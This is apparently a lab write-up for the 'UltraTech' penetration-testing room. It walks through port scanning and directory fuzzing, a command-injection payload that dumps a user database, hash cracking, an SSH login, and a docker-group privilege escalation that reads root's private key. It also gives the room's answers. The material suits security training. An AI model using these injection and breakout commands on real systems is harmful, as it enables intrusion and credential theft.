# Hi, I'm a Cybersecurity Analyst 
### Focused on analyzing threats, demonstrating attack scenarios, and conducting security investigations.
### UltraTech
<img width="1717" height="404" alt="image" src="https://github.com/user-attachments/assets/719934c0-c49e-45c8-9058-18faa51182ab" />

### The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing
## Task 1 Deploy the machine

### UltraTech - Mission Overview  

### You have been hired by UltraTech to perform a grey-box penetration test against their infrastructure.  

### • The assessment is based on real-world vulnerabilities and misconfigurations  
### • You are provided with only the company name and the target server IP address  
### • Enumeration is the key to discovering attack paths and vulnerabilities  
### • If you get stuck, continue gathering information and exploring the target  
### • Your goal is to identify weaknesses and assess the security of UltraTech's infrastructure

## Task 2 
### It's enumeration time!
### Turn on the Target Machine : 10.49.182.113
<img width="1637" height="223" alt="image" src="https://github.com/user-attachments/assets/df790638-d162-46f0-994a-f3c71ef0c354" />

### Lets Network mapping, Enter the command: sudo nmap -sV -sC -p- 10.49.182.113
<img width="1559" height="774" alt="image" src="https://github.com/user-attachments/assets/75b59a64-7ba6-4b5e-99f8-3ec9564b8712" />

### After enumerating the services and resources available on this machine, what did you discover?
### Answer the questions below
### Q.Which software is using the port 8081?
<img width="1389" height="296" alt="image" src="https://github.com/user-attachments/assets/749e6af8-84d0-4594-a592-f287462ae917" />

### Node.js
### Q.Which other non-standard port is used?
<img width="1091" height="398" alt="image" src="https://github.com/user-attachments/assets/24d6af7a-0d38-4df6-808d-fc9b5486f4da" />

### 31331

### Q.Which software using this port?
<img width="1004" height="269" alt="image" src="https://github.com/user-attachments/assets/49eda9a3-dde6-4553-90b7-ce21c744b8e0" />

### Apache

### Q.Which GNU/Linux distribution seems to be used?
<img width="1164" height="320" alt="image" src="https://github.com/user-attachments/assets/de65fad4-34a1-42e1-8a68-9f39c55ab702" />

### Ubuntu 

## Task 3 Let the fun begin
### Exploitation Phase  
### After identifying available services, the next step is to investigate authentication mechanisms and look for weaknesses in their implementation.  
### • Examine any login portals or authentication pages discovered during enumeration  
### • Test for common input validation and data-handling weaknesses  
### • Look for exposed files, directories, APIs, or database interactions 

### Lets navigate to the websites
### UltraTech Website (Port 31331)  http://10.49.182.113:31331/
<img width="1919" height="697" alt="image" src="https://github.com/user-attachments/assets/437e3ef0-847a-46bd-927b-0847a2577d4c" />

### add view-source: in the front of the url to see source code
### view-source:http://10.49.182.113:31331/ and we can see the email of the company
<img width="1870" height="754" alt="image" src="https://github.com/user-attachments/assets/f8da36ff-e3f1-4420-9b07-f706f6f2edb0" />

### Lets see port 8081
<img width="1612" height="138" alt="image" src="https://github.com/user-attachments/assets/64284788-94cc-410b-bb37-80cbc9c05950" />

### Answers
<img width="1610" height="734" alt="image" src="https://github.com/user-attachments/assets/fb352f18-a1aa-4250-8698-038214b7fcb6" />


## Task 3 Let the fun begin
### Q. There is a database lying around, what is its filename?
### Lets do directory enumeration : Enter the command 
### ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.49.182.113:8081/FUZZ

### ffuf: This is the tool used to perform directory fuzzing/enumeration
### -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ: This will use the wordlist we specify (directory-list-2.3-medium.txt) and the :FUZZ is the keyword used for fuzzing a certain part of the target URL.
### -u http://10.201.72.139:8081/FUZZ: Target URL. This is the url you want to fuzz and the FUZZ keyword is a placeholder where the items in the wordlist will be placed.
<img width="1920" height="768" alt="image" src="https://github.com/user-attachments/assets/da5023e3-fd43-4c47-a42c-800d0db2d408" />

### We can see the auth and ping
<img width="1241" height="198" alt="image" src="https://github.com/user-attachments/assets/f762cd8e-647a-4e41-89e4-bdb3044d2201" />

### Now lets try the data enumeration on the port 31331
<img width="1747" height="824" alt="image" src="https://github.com/user-attachments/assets/6ed2bf0f-49b9-46c4-9fcd-9ecbfa73e84f" />

### We can see the css and js 
<img width="1672" height="477" alt="image" src="https://github.com/user-attachments/assets/e337f210-fff2-4132-94d9-44a6610d695b" />

### Exploitation
### While exploring the UltraTech website on port 31331, an interesting file named `api.js` was discovered.
### Reviewing the file revealed a function used by the UltraTech API and identified the parameter required by the ping endpoint.
<img width="1402" height="784" alt="image" src="https://github.com/user-attachments/assets/e0818231-7cb2-4a32-81d7-b31f23b8a742" />

### command injection
### The application was found to be vulnerable to Command Injection, allowing user-supplied input to execute system commands on the server.  
### • Command Injection occurs when user input is executed as part of a system command  
### • Command Substitution can be used to execute commands inside backticks ( `command` )  
### • The command inside the backticks runs before the main command is processed  
### • The output of the executed command is then passed as input to the original command
### Command Substitution executes the command inside backticks first and replaces it with its output.
### `ping \`pwd\`` runs `pwd` first, which returns `/home/www/api`.
<img width="1257" height="332" alt="image" src="https://github.com/user-attachments/assets/d193113b-c3c2-437b-9d3c-db9391cad665" />

### Lets try command ls
<img width="1270" height="270" alt="image" src="https://github.com/user-attachments/assets/c2828d04-3a16-400b-9f9d-c19814bc8b6d" />

### Doing more command injection attacks, we found a file called utech.db.sqlite by running the ls command on the server.
### We tried to view the database’s contents by running the cat command and we got the following:
### http://10.201.72.139:8081/ping?ip=`cat%20utech.db.sqlite`
<img width="1275" height="200" alt="image" src="https://github.com/user-attachments/assets/b2b5f027-3762-41b7-850a-5bc2429d88fd" />

### r00t:f357a0c52799563c7c7b76c1e7543a32
### admin:0d0ea5111e3c1def594c1684e3b9be84

### Q. What is the first user's password hash?
### Lets crack the hash using CrackStation.
<img width="1070" height="443" alt="image" src="https://github.com/user-attachments/assets/3054de1a-b91c-4e6d-b1aa-1787e69f5578" />

### n100906
### Answers
<img width="1621" height="481" alt="image" src="https://github.com/user-attachments/assets/0d02c277-7363-4b09-b3a8-505facdbc8e8" />

## Task 4 The root of all evil
### The final step requires you to combine everything discovered during enumeration and exploitation.
### • Use the information gathered from previous findings  
### • Investigate any exposed files, endpoints, credentials, or misconfigurations  
### • Look for mistakes made during implementation or system configuration  

### Q. What are the first 9 characters of the root user's private SSH key?
### We know that SSH is open, we can leverage the credentials we found to connect to the server.
### Enter the command : ssh r00t@10.49.182.113
<img width="639" height="499" alt="image" src="https://github.com/user-attachments/assets/d3af49e9-4c47-4f45-8668-c02bc1a0d32a" />

### We are logged into root@ultratech-prod
### Privilege Escalation
### During post-compromise enumeration, the `id` command revealed that the user `r00t` belongs to the `docker` group.
### Membership in the Docker group can be dangerous, as it may allow the execution of Docker commands that can be leveraged for privilege escalation.
<img width="509" height="223" alt="image" src="https://github.com/user-attachments/assets/35c166f4-8fbc-4a2a-99ed-a3c6ae38c296" />

### We then look for the privesc for docker in GTFOBins to gain root permission.
### Enter the command
### docker run -v /:/mnt --rm -it bash chroot /mnt sh
<img width="997" height="156" alt="image" src="https://github.com/user-attachments/assets/13de43fc-d470-43de-b959-7f87f438f369" />

### After gaining root permission, we then need to find the id_rsa key to complete our goal.
<img width="844" height="161" alt="image" src="https://github.com/user-attachments/assets/c12cb737-f128-40be-ab92-001afcda7d63" />

### We can see id_rsa.Lets read the file
### cat id_rsa
<img width="861" height="202" alt="image" src="https://github.com/user-attachments/assets/ae9ca436-fdf2-4426-8d7a-902f5cb0c5f9" />

### Answers 
<img width="1613" height="224" alt="image" src="https://github.com/user-attachments/assets/d9e921b7-b7f4-4b27-ae02-b15ce0fe6de9" />

## Congratulations !!! We have Successfully Completed the Room.
<img width="1667" height="414" alt="image" src="https://github.com/user-attachments/assets/7715937c-3c81-4f60-9a4a-04b08cd9d245" />












